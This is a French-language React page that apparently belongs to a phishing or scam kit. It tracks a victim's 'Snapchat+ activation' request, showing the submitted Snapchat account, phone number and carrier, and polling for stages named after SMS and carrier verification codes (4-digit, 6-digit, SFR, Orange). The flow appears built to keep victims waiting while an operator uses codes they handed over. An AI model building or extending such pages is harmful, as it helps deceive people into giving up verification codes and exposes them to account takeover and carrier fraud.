import { useState, useEffect } from "react";
import { motion } from "framer-motion";
import { Check, Clock, KeyRound, ShieldCheck, Loader2, ArrowLeft } from "lucide-react";
import { base44 } from "@/api/base44Client";
import Logo from "@/components/Logo";
import NotificationBell from "@/components/NotificationBell";

const STEPS = [
  { key: "pending", label: "Demande envoyée", desc: "Votre demande a bien été reçue", icon: Clock },
  { key: "code", label: "Code envoyé", desc: "Le code de vérification a été envoyé", icon: KeyRound },
  { key: "validation", label: "En validation", desc: "Votre code est en cours de vérification", icon: Loader2 },
  { key: "valid", label: "Demande validée", desc: "Snapchat+ a été activé avec succès", icon: ShieldCheck },
];

const STATUS_MAP = {
  pending: 0,
  code_ready: 1,
  code6_ready: 1,
  code6sfr_ready: 1,
  code6orange_ready: 1,
  code_valid: 3,
  waiting_queue: 0,
};

const STATUS_LABELS = {
  pending: "En attente de code",
  code_ready: "Code prêt (4 chiffres)",
  code6_ready: "Code envoyé (6 chiffres)",
  code6sfr_ready: "Code 6 SFR envoyé",
  code6orange_ready: "Code 6 Orange envoyé",
  code_valid: "Demande validée ✓",
  code_wrong: "Code incorrect",
  code_expired: "Code expiré",
  waiting_queue: "En file d'attente",
};

export default function Suivi() {
  const urlParams = new URLSearchParams(window.location.search);
  const id = urlParams.get("id") || sessionStorage.getItem("submissionId");

  const [data, setData] = useState(null);
  const [status, setStatus] = useState(null);
  const [loading, setLoading] = useState(true);
  const [notFound, setNotFound] = useState(false);

  useEffect(() => {
    if (!id) { setNotFound(true); setLoading(false); return; }
    sessionStorage.setItem("submissionId", id);

    const fetchStatus = async () => {
      try {
        const res = await base44.functions.invoke("checkStatus", { submissionId: id });
        setStatus(res?.data?.status || "pending");
        setData(res?.data?.submission || null);
      } catch {
        setNotFound(true);
      }
      setLoading(false);
    };
    fetchStatus();
    const interval = setInterval(fetchStatus, 3000);
    return () => clearInterval(interval);
  }, [id]);

  const currentStep = STATUS_MAP[status] ?? 0;
  const isWrong = status === "code_wrong";
  const isExpired = status === "code_expired";

  const formatPhone = (tel) => tel?.replace(/(\d{2})(?=\d)/g, "$1 ").trim();
  const formatDate = (d) => {
    if (!d) return "";
    return new Date(d).toLocaleString("fr-FR", {
      day: "2-digit", month: "2-digit", hour: "2-digit", minute: "2-digit",
    });
  };

  return (
    <>
      <div className="fixed top-4 right-4 z-50">
        <NotificationBell />
      </div>
      <div className="min-h-screen bg-background relative overflow-hidden flex items-center justify-center px-4 py-8 md:py-12">
        <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[600px] h-[600px] bg-primary/10 rounded-full blur-[120px] pointer-events-none hidden md:block" />

        <motion.div
          initial={{ opacity: 0, y: 24 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
          className="relative z-10 w-full max-w-md"
        >
          <div className="bg-card border border-border rounded-3xl px-6 py-8 shadow-2xl shadow-black/60">
            <div className="mb-6 text-center">
              <Logo />
            </div>

            {loading ? (
              <div className="flex flex-col items-center justify-center py-10">
                <div className="w-8 h-8 border-4 border-primary/30 border-t-primary rounded-full animate-spin mb-4" />
                <p className="text-muted-foreground text-sm">Chargement de votre suivi...</p>
              </div>
            ) : notFound || !id ? (
              <div className="text-center py-10">
                <div className="text-4xl mb-4">🔍</div>
                <h2 className="font-heading text-xl font-bold text-foreground mb-2">Demande introuvable</h2>
                <p className="text-muted-foreground text-sm mb-6">
                  Aucune soumission ne correspond à ce lien. Vérifiez que l'URL est correcte.
                </p>
                <a href="/" className="inline-flex items-center gap-2 px-5 py-2.5 bg-primary text-primary-foreground rounded-xl text-sm font-bold hover:bg-primary/80 transition-colors">
                  <ArrowLeft className="w-4 h-4" /> Retour à l'accueil
                </a>
              </div>
            ) : (
              <>
                {/* Infos soumission */}
                <div className="bg-secondary/30 border border-border rounded-xl px-4 py-3 mb-6">
                  <div className="flex items-center justify-between mb-2">
                    <span className="text-muted-foreground text-xs">Compte Snapchat</span>
                    <span className="text-foreground font-semibold text-sm">{data?.snapchat || "—"}</span>
                  </div>
                  <div className="flex items-center justify-between mb-2">
                    <span className="text-muted-foreground text-xs">Téléphone</span>
                    <span className="text-foreground font-semibold text-sm">{formatPhone(data?.telephone)}</span>
                  </div>
                  {data?.operateur && (
                    <div className="flex items-center justify-between mb-2">
                      <span className="text-muted-foreground text-xs">Opérateur</span>
                      <span className="text-foreground font-semibold text-sm">{data.operateur}</span>
                    </div>
                  )}
                  <div className="flex items-center justify-between">
                    <span className="text-muted-foreground text-xs">Demande du</span>
                    <span className="text-foreground font-semibold text-sm">{formatDate(data?.created_date)}</span>
                  </div>
                </div>

                {/* Statut actuel */}
                <div className={`text-center mb-6 px-4 py-2.5 rounded-xl border ${
                  isWrong ? "bg-red-500/10 border-red-500/30" :
                  isExpired ? "bg-orange-500/10 border-orange-500/30" :
                  status === "code_valid" ? "bg-green-500/10 border-green-500/30" :
                  "bg-primary/10 border-primary/30"
                }`}>
                  <p className="text-xs text-muted-foreground mb-1">Statut actuel</p>
                  <p className={`font-bold text-sm ${
                    isWrong ? "text-red-400" : isExpired ? "text-orange-400" :
                    status === "code_valid" ? "text-green-400" : "text-primary"
                  }`}>
                    {STATUS_LABELS[status] || status}
                  </p>
                </div>

                {/* Timeline */}
                <div className="relative pl-2">
                  {STEPS.map((step, idx) => {
                    const isDone = idx < currentStep;
                    const isActive = idx === currentStep && !isWrong && !isExpired;
                    const Icon = step.icon;
                    return (
                      <div key={step.key} className="flex gap-4 pb-6 last:pb-0 relative">
                        {/* Ligne verticale */}
                        {idx < STEPS.length - 1 && (
                          <div className="absolute left-[18px] top-10 bottom-0 w-0.5 bg-border" />
                        )}
                        {/* Cercle icône */}
                        <div className={`relative z-10 w-9 h-9 rounded-full flex items-center justify-center flex-shrink-0 border-2 transition-all ${
                          isDone ? "bg-green-500/20 border-green-500 text-green-400" :
                          isActive ? "bg-primary/20 border-primary text-primary" :
                          "bg-muted border-border text-muted-foreground/40"
                        }`}>
                          {isDone ? <Check className="w-4 h-4" /> :
                           isActive ? <Icon className={`w-4 h-4 ${step.key === "validation" ? "animate-spin" : ""}`} /> :
                           <Icon className="w-4 h-4" />}
                          {isActive && (
                            <span className="absolute inset-0 rounded-full border-2 border-primary animate-ping opacity-40" />
                          )}
                        </div>
                        {/* Texte */}
                        <div className="flex-1 pt-1">
                          <p className={`text-sm font-semibold ${isDone || isActive ? "text-foreground" : "text-muted-foreground/50"}`}>
                            {step.label}
                          </p>
                          <p className={`text-xs mt-0.5 ${isDone || isActive ? "text-muted-foreground" : "text-muted-foreground/40"}`}>
                            {step.desc}
                          </p>
                        </div>
                      </div>
                    );
                  })}
                </div>

                {/* Alerte erreur */}
                {(isWrong || isExpired) && (
                  <motion.div
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    className={`mt-4 rounded-xl px-4 py-3 border text-center ${
                      isWrong ? "bg-red-500/10 border-red-500/30 text-red-400" : "bg-orange-500/10 border-orange-500/30 text-orange-400"
                    }`}
                  >
                    <p className="text-sm font-medium">
                      {isWrong ? "Le code saisi est incorrect." : "Le code a expiré."}
                    </p>
                    <p className="text-xs text-muted-foreground mt-1">
                      Veuillez contacter le support pour plus d'informations.
                    </p>
                  </motion.div>
                )}

                <a href="/" className="mt-6 flex items-center justify-center gap-1 text-muted-foreground/60 text-xs hover:text-muted-foreground transition-colors">
                  <ArrowLeft className="w-3 h-3" /> Retour à l'accueil
                </a>
              </>
            )}
          </div>
        </motion.div>
      </div>
    </>
  );
}